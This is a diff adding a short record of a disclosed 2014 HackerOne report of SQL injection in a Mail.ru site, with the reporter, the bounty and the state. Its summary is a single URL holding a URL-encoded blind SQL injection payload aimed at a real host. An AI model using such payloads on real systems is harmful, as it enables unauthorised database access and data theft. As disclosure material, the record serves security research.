@@ -1,0 +1,12 @@
+ReportLink:https://hackerone.com/reports/10037
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/vah13
+ReportedTo:Mail.ru(mailru)
+BountyAmount:150.0
+Severity:
+State:Closed
+DateOfDisclosure:30.05.2014 11:40:23
+
+Summary:
+
+http://parapa.mail.ru/gallery/BirthdayParaPa/-1%27%20or%201=IF%28LENGTH%28ASCII%28%28SELECT%20USER%28%29%29%29%29=3,%201,%200%29%20--%20//
